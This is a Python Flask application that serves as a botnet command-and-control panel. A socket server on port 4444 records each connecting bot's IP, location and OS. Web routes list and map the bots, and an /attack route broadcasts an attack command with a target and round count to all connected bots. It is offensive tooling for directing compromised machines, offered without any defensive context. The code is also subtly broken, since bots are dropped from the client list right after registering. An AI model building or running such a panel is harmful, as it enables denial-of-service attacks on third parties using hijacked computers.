from flask import Flask, render_template, request, jsonify
import sqlite3
import threading
import socket
import json
import os
from geopy.geocoders import Nominatim

app = Flask(__name__)

DATABASE = 'bots.db'
SOCKET_PORT = 4444
clients = []

# Initialize the database
def init_db():
    if not os.path.exists(DATABASE):
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS bots (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        ip TEXT,
                        latitude REAL,
                        longitude REAL,
                        location TEXT,
                        os TEXT
                    )''')
        conn.commit()
        conn.close()

init_db()

# Socket server for bot communication
def handle_bot_connection(conn, addr):
    try:
        clients.append(conn)
        data = conn.recv(1024).decode()
        if not data:
            raise ValueError("No data received from client")
        
        bot_info = json.loads(data)  # Parse JSON data from bot
        print(f"Received bot info from {addr}: {bot_info}")  # Debugging: print received data

        with sqlite3.connect(DATABASE) as conn_db:
            c = conn_db.cursor()
            c.execute("INSERT INTO bots (ip, latitude, longitude, location, os) VALUES (?, ?, ?, ?, ?)", 
                      (bot_info['ip'], bot_info['latitude'], bot_info['longitude'], bot_info['location'], bot_info['os']))
            conn_db.commit()
    except json.JSONDecodeError:
        print(f"Error handling bot {addr}: Invalid JSON received")
    except Exception as e:
        print(f"Error handling bot {addr}: {e}")
    finally:
        clients.remove(conn)
        conn.close()

def start_socket_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('', SOCKET_PORT))
    server_socket.listen(5)
    print(f"Socket server running on port {SOCKET_PORT}")
    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_bot_connection, args=(conn, addr)).start()

# Flask Routes
@app.route('/session')
def session():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM bots")
    bots = c.fetchall()
    conn.close()
    return render_template('session.html', bots=bots)

@app.route('/map')
def map_view():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT latitude, longitude, ip, location FROM bots")
    bot_locations = c.fetchall()
    conn.close()
    return render_template('map.html', locations=bot_locations)

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    if request.method == 'POST':
        target = request.form['target']
        rounds = request.form['rounds']

        # Resolve the target's geolocation using geopy
        geolocator = Nominatim(user_agent="geoapi")
        target_location = geolocator.geocode(target)
        if target_location is None:
            return jsonify({"status": "Error: Could not resolve target location"})
        target_lat = target_location.latitude
        target_lon = target_location.longitude

        command = {"action": "attack", "target": target, "rounds": rounds}
        
        # Send the command to all connected clients
        for client in clients:
            try:
                client.send(json.dumps(command).encode())
            except Exception as e:
                print(f"Failed to send command to a client: {e}")
        
        return render_template('map.html', locations=get_bot_locations(), target_lat=target_lat, target_lon=target_lon)
    return render_template('attack.html')

def get_bot_locations():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT latitude, longitude, ip, location FROM bots")
    bot_locations = c.fetchall()
    conn.close()
    return bot_locations

if __name__ == '__main__':
    threading.Thread(target=start_socket_server, daemon=True).start()
    app.run(port=9999)
